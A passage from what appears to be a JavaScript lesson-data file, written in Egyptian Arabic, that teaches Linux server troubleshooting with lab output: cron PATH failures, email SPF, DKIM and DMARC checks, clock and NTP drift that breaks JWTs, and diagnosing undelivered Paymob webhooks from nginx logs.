الخمس نجوم: دقيقة، ساعة، يوم، شهر، يوم في الأسبوع. و [[>> /var/log/backup.log 2>&1]]:

- [[>>]] زوّد في آخر الملف (مش امسحه وابدأ من جديد زي [[>]]).
- [[2>&1]] والأخطاء كمان (stderr) تروح نفس المكان.

من غير التوجيه ده، الخطأ كان هيروح في «No MTA installed, discarding output» ومكنتش هتعرفه.

---

## ٣. [[sudo tail -20 /var/log/backup.log]]

~~~text الناتج
/home/deploy/backup.sh: 4: db-backup: not found
~~~

السطر ٤ في السكربت ([[db-backup]]) مش موجود **من وجهة نظر cron**، مع إنه شغال من الترمنال.

---

## ٤. الاختبار الفاصل: شغّله ببيئة cron

~~~bash
env -i HOME=/home/deploy LOGNAME=deploy PATH=/usr/bin:/bin SHELL=/bin/sh /bin/sh -c '/home/deploy/backup.sh'
~~~

| الحتة | معناها |
|---|---|
| [[env -i]] | ابدأ ببيئة **فاضية** خالص (i = ignore environment) |
| [[HOME=... LOGNAME=...]] | حط بس المتغيرات اللي cron بيحطها |
| [[PATH=/usr/bin:/bin]] | الـ PATH بتاع cron، قصير جدًا |
| [[SHELL=/bin/sh]] و [[/bin/sh -c '...']] | شغّل بـ [[sh]] زي cron، مش bash |

شغّلته كـ deploy:

~~~text الناتج
/home/deploy/backup.sh: 4: db-backup: not found
rc=127
~~~

نفس الخطأ بالظبط. يعني اتأكدت إن السبب البيئة، من غير ما تستنى cron كل مرة. ([[127]] = الأمر مش موجود.) وقارن بـ PATH بتاع الترمنال:

~~~text echo $PATH في ترمنال deploy
/home/deploy/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:...
~~~

أول مكان [[~/.local/bin]] (بيتضاف من [[.profile]])، ومش موجود عند cron.

---

## ٥. [[which pg_dump docker]]

[[which]] بيقولك المسار الكامل لكل أمر في الـ PATH الحالي. في المعمل سألت عن [[db-backup docker pg_dump]]:

~~~text الناتج
/home/deploy/.local/bin/db-backup
/usr/bin/docker
rc=1
~~~

[[pg_dump]] مطلعش (مش متسطب هنا)، فـ [[which]] خرج بـ 1. والمسارات اللي طلعت هي اللي تكتبها في السكربت: [[/home/deploy/.local/bin/db-backup]] بدل [[db-backup]]. أو أول السكربت:

~~~text backup.sh
PATH=/home/deploy/.local/bin:/usr/local/bin:/usr/bin:/bin
~~~

---

## ٦. [[systemctl status cron]]

~~~text الناتج
● cron.service - Regular background program processing daemon
     Loaded: loaded (/usr/lib/systemd/system/cron.service; enabled; preset: enabled)
     Active: active (running) since Tue 2026-10-06 12:42:47 UTC; 45min ago
   Main PID: 76 (cron)
~~~

[[active (running)]] شغال، و [[enabled]] هيقوم بعد الريستارت. لو [[inactive]]، ولا مهمة هتشتغل.

---

## الجدول

| السؤال | الأمر | الإجابة في المعمل |
|---|---|---|
| cron شغّلها؟ | [[grep CRON syslog]] | أيوه |
| الصيغة سليمة؟ | [[crontab -l]] و syslog | سطر الـ [[%]] مقطوع |
| السكربت قال إيه؟ | [[tail backup.log]] | [[db-backup: not found]] |
| بيئة cron هي السبب؟ | [[env -i ... /bin/sh -c]] | أيوه، نفس الخطأ |
| المسار الكامل؟ | [[which]] | [[/home/deploy/.local/bin/db-backup]] |
| cron نفسه شغال؟ | [[systemctl status cron]] | أيوه |

## الخلاصة

- لو المهمة في syslog، cron بريء والمشكلة جوه السكربت.
- وجّه الناتج لملف دايمًا ([[>> file 2>&1]])، وإلا الخطأ بيترمي.
- اختبر بـ [[env -i]] قبل ما تقول «شغال»، واكتب مسارات كاملة.`,
          lines: [
            "cron شغّل المهمة أصلًا؟ (لو مش هنا، الصيغة أو cron نفسه).",
            "الصيغة: % من غير escape؟ مسار نسبي؟",
            "لوج المهمة (لو موجّهة للوج زي ما المفروض).",
            "شغّل السكربت ببيئة فاضية زي cron بالظبط: لو فشل هنا بس، المشكلة PATH.",
            "المسارات الكاملة اللي تحطها في السكربت.",
            "cron نفسه شغال؟"
          ],
          sol: R`السبب الأشهر إطلاقًا: البيئة. cron بيشغّل السكربتات ببيئة شبه فاضية (PATH محدود، مفيش متغيرات الـ shell بتاعتك)، فسكربت بيشتغل تمام من الترمنال بيفشل في cron لأنه بينده [[docker]] أو [[pg_dump]] بالاسم وcron مش لاقيه في الـ PATH.

الأمر الرابع هو الاختبار الفاصل: [[env -i HOME=... PATH=/usr/bin:/bin /bin/sh -c '/path/backup.sh']] بيشغّل السكربت ببيئة فاضية زي cron بالظبط. لو فشل هنا ونجح من الترمنال العادي، أكدت إن المشكلة البيئة. الحل: اكتب المسارات الكاملة في السكربت ([[/usr/bin/docker]] بدل [[docker]])، أو حط [[PATH=...]] في أول السكربت أو في الـ crontab.

[[grep CRON /var/log/syslog]] بيوريك هل cron حاول يشغّل السكربت أصلًا: لو مفيش أي سطر، يبقى الـ crontab نفسه غلط (نسيت تعمل [[crontab crontab.txt]]، أو صيغة التوقيت غلط)، شوف [[crontab -l]] و [[systemctl status cron]]. لو فيه سطر CRON بس السكربت فشل، المشكلة جوه السكربت (غالبًا PATH أو صلاحيات). و[[tail /var/log/backup.log]] بيوريك الخطأ لو السكربت بيكتب لوج.`
        },
        {
          cmd: "الإيميلات مش بتوصل",
          title: "بتتبعت من الكود وبتروح spam أو مبتوصلش",
          desc: "السيرفرات الجديدة بورت 25 مقفول فيها غالبًا (الاستضافة بتقفله ضد السبام). والإيميل من غير SPF و DKIM بيروح spam. الحل العملي: خدمة إرسال (Resend، Postmark، SES) بـ API أو SMTP على 587، وسجلات DNS صح.",
          example: R`nc -zv -w 5 smtp.resend.com 587
nc -zv -w 5 gmail-smtp-in.l.google.com 25
dig TXT send.example.com +short
dig TXT resend._domainkey.example.com +short
dig TXT _dmarc.example.com +short
docker compose logs --since 30m api | grep -iE "mail|smtp|resend"`,
          try: "ابعت إيميل لعنوان على mail-tester.com وشوف الدرجة والأسباب. غالبًا SPF أو DKIM ناقص.",
          deep: {
            why: "الكود بيقول «اتبعت» والمستخدم مش بيستلم، أو بيلاقيه في spam. البريد نظام له قواعده: بورتات، وسجلات DNS، وسمعة.",
            how: R`[[nc 587]] لخدمة الإرسال: مفتوح؟ 587 هو بورت الإرسال الحديث (submission) وغالبًا مفتوح. [[nc 25]] لسيرفر جوجل: 25 هو بورت السيرفرات لبعض، والاستضافات بتقفله على VPS الجديدة ضد السبام. لو 25 مقفول، مينفعش تبعت مباشرة من السيرفر، ودي مش مشكلة لأن الأصح خدمة إرسال أصلًا.

سجلات DNS التلاتة: [[TXT example.com]] فيه SPF: بيقول «مين مسموح له يبعت باسم دومينك» (Resend بيحطه على subdomain اسمه [[send]]: [[v=spf1 include:amazonses.com ~all]]، والقيمة الصح دايمًا من لوحة الخدمة). [[DKIM]] على subdomain الخدمة: توقيع رقمي بيثبت إن الرسالة متغيرتش، والخدمة بتديك القيمة. [[_dmarc]]: سياسة لو SPF/DKIM فشلوا.

من غير التلاتة، Gmail بيحط الرسالة في spam أو يرفضها.

[[logs | grep mail]]: الكود بعت فعلًا؟ الخدمة ردت بإيه؟ الخدمات بترجع id للرسالة وبيبقى ليها لوحة بتوريك اتسلّمت ولا bounced.

mail-tester.com: تبعت إيميل لعنوان مؤقت وبيديك درجة من ١٠ مع كل سبب.`,
            when: "إيميلات التسجيل والدفع مش واصلة. قبل إطلاق أي موقع بيبعت إيميل.",
            mistakes: "تبعت من Gmail SMTP بحسابك الشخصي في الإنتاج. حدود صغيرة وبيتقفل. خدمة إرسال من الأول."
          },
          teach: R`## الفكرة: سؤالين منفصلين

1. **الإيميل خارج من السيرفر أصلًا؟** ده سؤال بورتات: الأمرين الأولين.
2. **لو خارج، بيوصل inbox ولا spam؟** ده سؤال DNS: هل الدومين بيقول للعالم «الخدمة دي مسموح لها تبعت باسمي»؟ التلات أوامر اللي بعدهم.

الناتج تحت من container أوبونتو 24.04 على جهاز في البيت (مش VPS)، على خوادم حقيقية: [[smtp.resend.com]] و Gmail، وسجلات DNS لـ [[example.com]] و [[gmail.com]] و [[resend.com]] نفسه كمثال لدومين متظبط صح.

---

## ١. [[nc -zv -w 5 smtp.resend.com 587]]

[[587]] بورت **submission**: البرنامج بتاعك بيسلّم الإيميل لخدمة إرسال، بيوزر وباسورد (API key). ده البورت اللي هتستخدمه.

~~~text الناتج
Connection to smtp.resend.com (54.157.71.137) 587 port [tcp/submission] succeeded!
~~~

مفتوح. لو مش مفتوح من السيرفر، استخدم الـ API بتاع الخدمة (HTTPS على 443) بدل SMTP خالص.

---

## ٢. [[nc -zv -w 5 gmail-smtp-in.l.google.com 25]]

[[25]] البورت اللي سيرفرات الإيميل بتكلّم بعض عليه. [[gmail-smtp-in.l.google.com]] سيرفر الاستقبال بتاع Gmail.

~~~text الناتج
nc: connect to gmail-smtp-in.l.google.com (142.250.110.27) port 25 (tcp) timed out: Operation now in progress
~~~

timed out: مزوّد النت (هنا نت البيت، وعلى VPS شركة الاستضافة) بيقفل 25 الخارج عشان الأجهزة المخترقة متبعتش spam. ده طبيعي ومش محتاج تصلّحه: انت مش المفروض تبعت على 25 مباشرة، الخدمة هي اللي بتعمل كده.

---

## ٣. SPF: [[dig TXT send.example.com +short]]

[[TXT]] نوع سجل DNS بيشيل نص حر. SPF (Sender Policy Framework) سجل TXT بيبدأ بـ [[v=spf1]] ومعناه «السيرفرات دي بس مسموح لها تبعت باسم الدومين ده». Resend بيحطه على subdomain اسمه [[send]].

~~~text على example.com
(فاضي)
~~~

مفيش سجل، فأي إيميل باسمه من Resend هيتشك فيه. وده على [[resend.com]] نفسه:

~~~text dig TXT send.resend.com +short
"v=spf1 include:amazonses.com ~all"
~~~

| الحتة | معناها |
|---|---|
| [[v=spf1]] | ده سجل SPF، نسخة ١ |
| [[include:amazonses.com]] | السيرفرات اللي في سجل SPF بتاع Amazon SES مسموح لها (Resend مبني عليه) |
| [[~all]] | أي حد تاني: «softfail»، اشك فيه (غالبًا spam) |
| [[-all]] | (لو مكانها) أي حد تاني: ارفضه |

وعلى [[example.com]] نفسه طلع [[v=spf1 -all]]: «محدش مسموح له يبعت باسمي خالص»، لأنه دومين أمثلة مش بيبعت إيميل.

---

## ٤. DKIM: [[dig TXT resend._domainkey.example.com +short]]

DKIM (DomainKeys Identified Mail) توقيع رقمي: الخدمة بتوقّع كل إيميل بمفتاح سري، والمفتاح العام بيتنشر في DNS عشان أي حد يتأكد إن الإيميل متغيّرش وإنه فعلًا من الخدمة دي. الاسم شكله [[selector._domainkey.domain]]، و [[resend]] هو الـ selector بتاع Resend.

~~~text على example.com
"v=DKIM1; p="
~~~

[[p=]] فاضي = المفتاح ملغي، يعني «أي توقيع باسمي مرفوض». وعلى [[resend.com]]:

~~~text الناتج (مقصوص)
"p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDQwODZs5a8LsLOM0cdArfFPsfhC4XrH9mwbUav
~~~

[[p=]] وبعدها المفتاح العام. القيمة دي بتنسخها من لوحة الخدمة زي ما هي، متكتبهاش بإيدك.

---

## ٥. DMARC: [[dig TXT _dmarc.example.com +short]]

DMARC بيقول للسيرفر اللي بيستقبل: «لو إيميل باسمي فشل في SPF و DKIM، تعمل فيه إيه؟».

~~~text على example.com
"v=DMARC1;p=reject;sp=reject;adkim=s;aspf=s"
~~~

~~~text على gmail.com
"v=DMARC1; p=none; sp=quarantine; rua=mailto:...@google.com"
~~~

| الحتة | معناها |
|---|---|
| [[p=]] | السياسة للدومين نفسه: [[none]] متعملش حاجة (راقب بس)، [[quarantine]] حطه في spam، [[reject]] ارفضه |
| [[sp=]] | نفس الكلام للـ subdomains |
| [[rua=mailto:...]] | ابعتلي تقارير يومية بالنتايج على العنوان ده |
| [[adkim=s]] و [[aspf=s]] | strict: الدومين لازم يطابق بالظبط |

للبداية: [[v=DMARC1; p=none; rua=mailto:عنوانك]]، وبعد ما تتأكد من التقارير إن كله تمام، ارفعها لـ [[quarantine]].

---

## ٦. [[docker compose logs --since 30m api | grep -iE "mail|smtp|resend"]]

لوج التطبيق في آخر نص ساعة، السطور اللي فيها كلمة عن الإيميل. بتدوّر على حاجة من دول:

| في اللوج | معناه |
|---|---|
| id للرسالة من الخدمة | اتبعتت. تابعها في لوحة الخدمة (delivered ولا bounced) |
| [[401]] أو [[invalid API key]] | المفتاح غلط أو مش موجود على السيرفر |
| [[ETIMEDOUT]] على 587 | البورت مقفول من السيرفر، استخدم الـ API |
| ولا سطر | الكود مبعتش أصلًا، أو مش بيسجّل |

(الناتج بيعتمد على كودك، فمفيش مثال ثابت هنا.)

---

## الجدول

| الأمر | سؤاله | النتيجة السليمة |
|---|---|---|
| [[nc 587]] | أقدر أسلّم للخدمة؟ | [[succeeded]] |
| [[nc 25]] | أقدر أبعت مباشرة؟ | غالبًا timed out، وده عادي |
| [[dig TXT send.]] | SPF | [[v=spf1 include:... ~all]] |
| [[dig TXT resend._domainkey.]] | DKIM | [[p=]] وبعدها مفتاح |
| [[dig TXT _dmarc.]] | DMARC | [[v=DMARC1; p=...]] |
| [[logs ... grep mail]] | الكود بعت؟ | id من الخدمة |

## الخلاصة

- بورت 25 مقفول تقريبًا دايمًا، وده مش مشكلتك. استخدم خدمة إرسال على 587 أو API.
- spam = غالبًا SPF أو DKIM أو DMARC ناقص. الـ [[dig]] التلاتة بيقولوك أنهي.
- mail-tester.com بيديك تقرير كامل في دقيقة.`,
          lines: [
            "بورت الإرسال (587) لخدمتك مفتوح؟",
            "بورت 25 مقفول غالبًا على VPS (وده عادي).",
            "سجل SPF على subdomain الإرسال (send): مين مسموح له يبعت.",
            "سجل DKIM بتاع الخدمة موجود؟",
            "سياسة DMARC.",
            "الكود بعت فعلًا؟ الخدمة ردت بإيه؟"
          ],
          sol: R`المشكلة نوعين: مش بتتبعت خالص، أو بتتبعت وبتروح spam. الأوامر بتفصلهم. [[nc -zv smtp.resend.com 587]] بيتأكد إن السيرفر يقدر يوصل لبوابة الإيميل: كتير من مزوّدي الاستضافة بيقفلوا بورت 25 (وأحيانًا 587) لمنع الـ spam، فلو فشل ده يبقى الإيميل مش طالع من السيرفر أصلًا، استخدم API (HTTPS) بدل SMTP.

لو بيتبعت وبيروح spam، السبب غالبًا سجلات DNS ناقصة. [[dig TXT ..._domainkey...]] بيوريك DKIM (توقيع الإيميل)، [[dig TXT send.example.com]] بيوريك SPF (مين مسموح يبعت باسم دومينك)، و[[dig TXT _dmarc.example.com]] بيوريك DMARC (السياسة). لو أي واحد ناقص، خوادم الاستقبال بتشك في الإيميل.

الاختبار العملي الأحسن: ابعت إيميل لعنوان من [[mail-tester.com]] وافتح صفحتهم، بيدوك درجة من ١٠ وبيقولك بالظبط إيه الناقص (SPF/DKIM/DMARC/محتوى). [[compose logs api | grep -i smtp]] بيوريك لو الكود نفسه بيفشل في الإرسال (مفتاح API غلط، رفض من المزوّد).`
        },
        {
          cmd: "الساعة غلط",
          title: "JWT expired فورًا، أو SSL errors غريبة",
          desc: "لو ساعة السيرفر بعيدة عن الوقت الحقيقي بدقايق، التوكنات بتبقى منتهية قبل ما تبدأ، وشهادات SSL بتتعتبر غير صالحة، ولوجات مش منطقية. NTP المفروض يظبطها لوحده، بس ممكن يكون واقف.",
          example: R`timedatectl
date -u && curl -sI https://google.com | grep -i '^date'
chronyc tracking 2>/dev/null || timedatectl show-timesync --all
sudo systemctl restart systemd-timesyncd
sudo timedatectl set-ntp true`,
          try: "قارن ناتج date -u بالـ Date header اللي جاي من جوجل في الأمر التاني. لو الفرق أكتر من ثانيتين، NTP مش شغال.",
          deep: {
            why: "مش بتخطر على بال حد، وبتعمل أعراض تخليك تدوّر في الكود ساعات: توكن بينتهي فورًا، وشهادة «مش صالحة لسه»، ولوجات بتواريخ مستقبلية.",
            how: R`[[timedatectl]] بيعرض الوقت المحلي و UTC وهل NTP مفعّل ومتزامن ([[System clock synchronized: yes]]).

الأمر التاني اختبار مستقل: [[date -u]] وقت السيرفر، والـ [[Date]] header من جوجل وقتهم. الفرق لازم ثواني. لو دقايق، الساعة غلط.

JWT فيه [[iat]] و [[exp]] بالثواني. لو السيرفر اللي بيوقّع (أو بيتحقق) ساعته متأخرة ٥ دقايق، توكن صالح ٥ دقايق بيبقى منتهي لحظة إصداره. ونفس الحاجة مع OTP و TOTP (Google Authenticator)، وشهادات SSL (notBefore في المستقبل).

[[chronyc tracking]] أو [[timesyncd]]: حالة المزامنة والفرق بالمللي ثانية. [[restart systemd-timesyncd]] يعيد المزامنة. [[set-ntp true]] لو كانت مقفولة.

على VPS الساعة بتتزامن من الـ hypervisor غالبًا، بس على بعض السيرفرات بتنحرف بعد suspend/resume أو لو NTP مقفول في الفايروول (UDP 123).`,
            when: "أي غرابة في التوكنات أو الشهادات أو أوقات اللوج.",
            mistakes: "تصلّح الساعة بـ [[date -s]] يدويًا. هترجع تنحرف. فعّل NTP."
          },
          teach: R`## الفكرة: كل حاجة فيها «صالح لحد امتى» بتعتمد على الساعة

التوكنات (JWT)، وأكواد الـ OTP، والشهادات، والطلبات الموقّعة: كلها بتقارن وقت فيها بساعة السيرفر. لو الساعة غلط بدقايق، حاجات سليمة تبان منتهية أو «لسه مبدأتش». الأوامر بتسأل: الساعة مظبوطة؟ ومين المسؤول عن ظبطها؟

اتشغّلت في معمل: سيرفر Ubuntu 24.04 بـ systemd جوه Docker. وخد بالك من نقطة مهمة في المعمل ده: الـ container مالوش ساعة لوحده، بيستخدم ساعة الماكينة اللي Docker شغال عليها. فالنتايج بتبيّن ده.

---

## ١. [[timedatectl]]

~~~text الناتج
               Local time: Tue 2026-10-06 13:29:42 UTC
           Universal time: Tue 2026-10-06 13:29:42 UTC
                 RTC time: n/a
                Time zone: Etc/UTC (UTC, +0000)
System clock synchronized: no
              NTP service: inactive
          RTC in local TZ: no
~~~

| السطر | معناه |
|---|---|
| [[Local time]] | الساعة بالتوقيت المحلي للسيرفر |
| [[Universal time]] | نفس اللحظة بـ UTC. السيرفرات الأحسن تبقى على UTC (زي هنا) |
| [[RTC time]] | ساعة الهاردوير (البطارية في اللوحة الأم). [[n/a]] لأن الـ container مالوش هاردوير |
| [[Time zone]] | المنطقة الزمنية |
| [[System clock synchronized]] | **أهم سطر**: الساعة متزامنة مع NTP؟ |
| [[NTP service]] | خدمة المزامنة شغالة؟ |

هنا الاتنين [[no]] و [[inactive]]. على VPS ده كان هيبقى إنذار. في الـ container ده طبيعي (الأمر ٣ بيقول ليه)، والأمر الجاي بيأكد إن الساعة نفسها مظبوطة.

على سيرفر سليم هتشوف:

~~~text من الـ docs
System clock synchronized: yes
              NTP service: active
~~~

---

## ٢. [[date -u && curl -sI https://google.com | grep -i '^date']]

اختبار مستقل عن أي إعدادات: قارن ساعتك بساعة جوجل.

- [[date -u]] الوقت دلوقتي بـ UTC.
- [[curl -sI https://google.com]] اطلب الـ headers من جوجل. أي سيرفر ويب بيبعت header اسمه [[Date]] فيه وقته هو.
- [[grep -i '^date']] السطر اللي **بيبدأ** ([[^]]) بـ date، من غير فرق حروف.

~~~text الناتج
Tue Oct  6 13:29:42 UTC 2026
date: Tue, 06 Oct 2026 13:29:43 GMT
~~~

ثانية واحدة فرق، وده وقت الطلب نفسه. ([[GMT]] و [[UTC]] نفس الساعة عمليًا.) لو الفرق دقايق، الساعة غلط مهما قالت الإعدادات.

---

## ٣. [[chronyc tracking 2>/dev/null || timedatectl show-timesync --all]]

أوبونتو بيستخدم واحد من برنامجين للمزامنة: [[chrony]] أو [[systemd-timesyncd]]. الأمر بيجرّب الأول، ولو مش موجود ([[||]]) يجرّب التاني. و [[2>/dev/null]] يخبي «command not found».

~~~text الناتج
Failed to parse bus message: Connection timed out
rc=1
~~~

[[chronyc]] مش موجود، و [[timesyncd]] مش شغال أصلًا، فمفيش حد يرد. وليه مش شغال؟

~~~bash
systemctl status systemd-timesyncd --no-pager
~~~

~~~text الناتج
○ systemd-timesyncd.service - Network Time Synchronization
     Loaded: loaded (/usr/lib/systemd/system/systemd-timesyncd.service; enabled; preset: enabled)
     Active: inactive (dead)
  Condition: start condition unmet at Tue 2026-10-06 13:29:43 UTC; 25s ago
             └─ ConditionVirtualization=!container was not met
~~~

الخدمة [[enabled]] بس عندها شرط [[ConditionVirtualization=!container]]: «متشتغليش لو انتي جوه container». لأن الـ container ميقدرش (ومينفعش) يغيّر ساعة الماكينة كلها. ونفس الشرط ده بيفسّر الـ [[no]] في الأمر الأول.

على سيرفر حقيقي بـ timesyncd، [[timedatectl show-timesync --all]] بيطبع (من الـ docs) سطور زي [[ServerName=ntp.ubuntu.com]] و [[NTPMessage=...]] (آخر رد من سيرفر الوقت، وفيه الفرق offset)، و [[chronyc tracking]] بيطبع [[System time : 0.000012 seconds fast of NTP time]].

---

## ٤ و ٥. الإصلاح: [[systemctl restart systemd-timesyncd]] و [[timedatectl set-ntp true]]

دول **مشغّلتهمش**، لأنهم بيغيّروا ساعة النظام، وفي المعمل ده الساعة دي ساعة الجهاز كله. من الـ docs:

| الأمر | بيعمل إيه |
|---|---|
| [[sudo systemctl restart systemd-timesyncd]] | يعيد تشغيل المزامنة، فتتزامن فورًا |
| [[sudo timedatectl set-ntp true]] | يفعّل NTP لو كان مقفول (بيعمل enable و start للخدمة) |

وبعدهم [[timedatectl]] تاني لحد ما تشوف [[System clock synchronized: yes]] (ممكن تاخد دقيقة). لو فضلت [[no]]، اتأكد إن UDP بورت 123 الخارج مش مقفول في الفايروول.

---

## ليه الساعة بتكسر التوكنات؟

توكن JWT فيه رقمين بالثواني من سنة ١٩٧٠: [[iat]] (اتعمل امتى) و [[exp]] (بينتهي امتى). مثال: سيرفر الـ login ساعته **متأخرة** ٦ دقايق، وبيعمل توكن صالح ٥ دقايق:

| | الساعة الحقيقية | سيرفر الـ login (متأخر ٦ دقايق) |
|---|---|---|
| وقت الإصدار | 13:30 | 13:24 ([[iat]]) |
| [[exp]] | | 13:29 |

السيرفر التاني ساعته مظبوطة (13:30) بيلاقي [[exp]] = 13:29 فات، فبيرفض التوكن لحظة إصداره: «jwt expired». ونفس الحكاية مع أكواد Google Authenticator وشهادات SSL ([[notBefore]] في المستقبل = «not yet valid»).

## الجدول

| الأمر | بيجاوب | السليم |
|---|---|---|
| [[timedatectl]] | NTP متزامن؟ | [[yes]] و [[active]] |
| [[date -u]] و Date header | الساعة صح فعلًا؟ | فرق ثانية أو اتنين |
| [[chronyc tracking]] أو [[show-timesync]] | الفرق عن سيرفر الوقت | مللي ثواني |
| [[restart systemd-timesyncd]] | مزامنة فورية | |
| [[set-ntp true]] | تفعيل المزامنة | |

## الخلاصة

- «expired» أو «not yet valid» من غير سبب = بص على الساعة الأول.
- قارن بالـ Date header: اختبار بسيط مش بيكدب.
- متظبطش الساعة بإيدك بـ [[date -s]]، فعّل NTP.`,
          lines: [
            "الوقت وهل NTP متزامن.",
            "قارن وقت السيرفر بالوقت اللي جوجل بيرجّعه في header.",
            "حالة المزامنة والفرق.",
            "أعد المزامنة.",
            "فعّل NTP لو كان مقفول."
          ],
          sol: R`ساعة السيرفر الغلط بتعمل أعطال محيّرة: JWT بيبان expired فور إصداره (لأن [[exp]] بيتحسب بساعة غلط)، شهادات SSL بتبان مش صالحة، وطلبات موقّعة بوقت (زي AWS/webhooks) بتترفض.

الاختبار البسيط: قارن [[date -u]] على سيرفرك بـ [[Date]] header جاي من جوجل. جربته وطلعوا متطابقين للثانية:

[[date -u]] → [[Wed Sep 30 05:15:38 UTC 2026]]
curl date header → [[date: Wed, 30 Sep 2026 05:15:38 GMT]]

لو الفرق أكتر من ثانية-اتنين، NTP (اللي بيزامن الساعة) مش شغال. [[timedatectl]] بيوريك [[System clock synchronized: yes]] و[[NTP service: active]] لو تمام. [[timedatectl set-ntp true]] و[[systemctl restart systemd-timesyncd]] بيفعّلوه ويزامنوا. (جوه container أوبونتو بـ systemd، [[timedatectl]] بيقول [[System clock synchronized: no]] لأن الـ container بياخد ساعة الجهاز اللي Docker شغال عليه و timesyncd مش بيشتغل جوه containers؛ مقارنة [[date -u]] بالـ header هي اللي أكدت إن الساعة مظبوطة. أوامر الإصلاح من الـ docs، مشغّلتهاش لأنها بتغيّر ساعة النظام.)

الفكرة: أي عطل فيه «expired» أو «not valid yet» أو توقيع بيفشل بدون سبب، اتأكد من الساعة الأول، دقيقتين بيوفّروا ساعات.`
        },
        {
          cmd: "webhook مش واصل",
          title: "الدفعة نجحت والطلب متفعّلش",
          desc: "Paymob بيقول المعاملة نجحت، وعندك مفيش حاجة. السؤال الأول: الطلب وصل سيرفرك أصلًا؟ لوج Nginx بيجاوب. لو وصل ورجع 4xx/5xx، لوج التطبيق بيقول ليه. لو موصلش، الـ URL المسجّل عندهم غلط أو بيشاور على سيرفر قديم.",
          example: R`sudo grep "/webhooks/paymob" /var/log/nginx/access.log | tail -10
sudo grep "/webhooks/paymob" /var/log/nginx/access.log | awk '{print $9}' | sort | uniq -c
docker compose logs --since 1h api | grep -i webhook
curl -X POST https://example.com/webhooks/paymob -H "Content-Type: application/json" -d '{"obj":{"id":1,"success":true}}' -i | head -3
dig +short example.com`,
          try: "العمود التاسع في الأمر التاني هو الـ status اللي رجّعته: 401 معناه التوقيع بيفشل (المفتاح غلط)، 500 الكود بيقع، 404 المسار غلط.",
          deep: {
            why: "العميل دفع، وPaymob بتقول نجحت، والاشتراك مش متفعّل. المشكلة في سلسلة من ٤ حلقات، ولوج Nginx بيقولك الحلقة المكسورة.",
            how: R`الحلقات: Paymob يبعت للـ URL المسجّل، يوصل Nginx، يوصل التطبيق، التطبيق يتحقق ويفعّل.

الأمر الأول: كل طلبات مسار الـ webhook في لوج Nginx. لو فاضي، الطلب موصلش أصلًا: الـ URL في لوحة Paymob غلط أو بيشاور على سيرفر قديم ([[dig +short]] يتأكد)، أو Paymob لسه محاولش (بيحاول بعد ثواني من الدفع).

التاني: الـ status codes اللي رجّعتها. 200 يعني التطبيق استلم ورد إنه تمام، فالمشكلة بعد كده في المنطق (التحقق من التكرار رفضها؟ الـ order id مش متطابق؟). 401 التوقيع فشل (HMAC secret غلط أو ترتيب الحقول). 404 المسار غلط. 500 الكود وقع. 502 التطبيق كان واقع وقتها.

التالت: لوج التطبيق للـ webhook.

الرابع: حاكي الطلب بإيدك على الـ URL العام (مش localhost) وشوف الرد. ده بيختبر Nginx والمسار من غير Paymob.

ولوحة Paymob فيها سجل للـ webhooks المرسلة وردودها، وزرار إعادة إرسال. وده أسرع اختبار بعد أي تصليح.`,
            when: "أي دفعة نجحت من غير تفعيل. وبعد نقل السيرفر (الـ URL!).",
            mistakes: "تختبر بـ curl على localhost وتقول شغال. الـ URL العام هو اللي Paymob بتستخدمه."
          },
          teach: R`## الفكرة: سلسلة من ٤ حلقات، ولوج Nginx بيقولك أنهي حلقة مكسورة

Paymob بيبعت ← الطلب يوصل Nginx ← Nginx يوصّله للتطبيق ← التطبيق يتحقق من التوقيع ويفعّل الطلب. كل أمر بيختبر حلقة.

عملت ده في معمل: سيرفر Ubuntu 24.04 بـ systemd جوه Docker، عليه Nginx وتطبيق Python (خدمة systemd اسمها [[api]]) فيه [[/webhooks/paymob]] بيرفض أي طلب من غير header توقيع. ومن جهاز تاني بعت طلبات زي اللي Paymob بيبعتها (من غير مفاتيح Paymob حقيقية طبعًا).

---

## ١. [[sudo grep "/webhooks/paymob" /var/log/nginx/access.log | tail -10]]

كل طلب على المسار ده وصل Nginx:

~~~text الناتج
172.20.0.3 - - [06/Oct/2026:13:31:30 +0000] "POST /webhooks/paymob HTTP/1.1" 401 0 "-" "Paymob-Webhook"
172.20.0.3 - - [06/Oct/2026:13:31:30 +0000] "POST /webhooks/paymob HTTP/1.1" 401 0 "-" "Paymob-Webhook"
172.20.0.3 - - [06/Oct/2026:13:31:30 +0000] "POST /webhooks/paymob HTTP/1.1" 401 0 "-" "Paymob-Webhook"
172.20.0.3 - - [06/Oct/2026:13:31:30 +0000] "POST /webhooks/paymob HTTP/1.1" 200 40 "-" "Paymob-Webhook"
~~~

| الحتة | معناها |
|---|---|
| [[172.20.0.3]] | مين بعت. على سيرفر حقيقي ده IP بتاع Paymob |
| [["POST /webhooks/paymob HTTP/1.1"]] | النوع والمسار |
| [[401]] | الـ status اللي سيرفرك **رجّعه** |
| [[0]] | حجم الرد |
| [["Paymob-Webhook"]] | الـ User-Agent |

لو الأمر مطبعش ولا سطر: الطلب **موصلش** سيرفرك أصلًا. السبب بره: الـ URL المسجّل في لوحة Paymob غلط (فيه typo، أو http بدل https، أو دومين قديم)، أو الدومين بيشاور على سيرفر تاني.

---

## ٢. الـ status لكل طلب

~~~bash
sudo grep "/webhooks/paymob" /var/log/nginx/access.log | awk '{print $9}' | sort | uniq -c
~~~

[[$9]] العمود التاسع = الـ status. و [[sort | uniq -c]] بيعدّ كل رقم:

~~~text الناتج
      1 200
      3 401
~~~

| الرقم | الحلقة المكسورة |
|---|---|
| [[200]] | وصل واتقبل. المشكلة في المنطق بعد كده (order id مش متطابق؟ اتعالج قبل كده؟) |
| [[401]] أو [[403]] | التوقيع (HMAC) فشل: السر غلط، أو الكود بيحسبه غلط |
| [[404]] | المسار في لوحة Paymob مش هو اللي في الكود أو Nginx |
| [[500]] | الكود وقع وهو بيعالج |
| [[502]] | التطبيق كان واقع ساعتها |

والـ 502 دي حصلت فعلًا في المعمل: أول مرة عدّلت التطبيق فيه غلطة syntax ووقع، والـ ٤ طلبات رجعوا:

~~~text الناتج وقتها
      4 502
~~~

---

## ٣. لوج التطبيق: [[docker compose logs --since 1h api | grep -i webhook]]

التطبيق في المعمل خدمة systemd مش container، فاللوج بتاعه في journald. المقابل:

~~~bash
journalctl -u api --since "-2min" --no-pager | grep -i webhook
~~~

~~~text الناتج
Oct 06 13:31:30 srv python3[7146]: api: webhook paymob rejected: invalid HMAC signature
